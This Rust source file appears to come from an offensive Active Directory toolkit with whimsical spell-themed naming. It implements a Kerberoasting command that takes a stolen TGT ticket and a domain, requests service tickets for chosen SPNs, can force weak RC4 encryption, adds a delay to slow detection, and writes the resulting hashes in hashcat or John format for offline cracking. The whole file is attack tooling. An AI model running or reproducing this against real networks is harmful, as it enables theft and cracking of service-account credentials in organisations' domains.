use anyhow::{bail, Result};
use std::collections::HashMap;

use crate::dungeon::cauldron::{kerberoast_spn, HashFormat};
use crate::dungeon::display_charm::*;
use crate::dungeon::wand_utils;

pub struct RoastingFeast;

impl super::Spell for RoastingFeast {
    fn incantation(&self) -> &'static str { "roasting-feast" }
    fn grimoire(&self) -> &'static str {
        "Kerberoast SPNs. /spn: or /spns: /ticket: /domain: [/rc4] [/format:hashcat|john] [/outfile:] [/delay:ms]"
    }

    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let tgt_b64 = args.get("ticket").ok_or_else(|| anyhow::anyhow!("/ticket: required"))?;
        let domain  = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let force_rc4 = args.contains_key("rc4");
        let fmt = match args.get("format").map(|s| s.as_str()) {
            Some("john") => HashFormat::John,
            _ => HashFormat::Hashcat,
        };
        let kirbi = wand_utils::b64_to_kirbi(tgt_b64)?;

        let spns: Vec<String> = if let Some(spn) = args.get("spn") {
            vec![spn.clone()]
        } else if let Some(spns_list) = args.get("spns") {
            spns_list.split(',').map(|s| s.trim().to_owned()).collect()
        } else {
            bail!("/spn: or /spns: required")
        };

        let delay_ms: u64 = args.get("delay").and_then(|s| s.parse().ok()).unwrap_or(0);
        let mut found = 0;
        let mut file_out: Option<std::fs::File> = args.get("outfile").map(|p| {
            std::fs::OpenOptions::new().append(true).create(true).open(p).unwrap()
        });

        for spn in &spns {
            match kerberoast_spn(spn, domain, &kirbi, force_rc4, fmt) {
                Ok(roasted) => {
                    found += 1;
                    print_success(&format!("Roasted: {} (etype {})", spn, roasted.etype));
                    println!("{}", roasted.hash);
                    if let Some(ref mut f) = file_out {
                        use std::io::Write;
                        writeln!(f, "{}", roasted.hash).ok();
                    }
                }
                Err(e) => print_warning(&format!("{}: {}", spn, e)),
            }
            if delay_ms > 0 {
                std::thread::sleep(std::time::Duration::from_millis(delay_ms));
            }
        }
        print_info("Total roasted", &found.to_string());
        Ok(())
    }
}
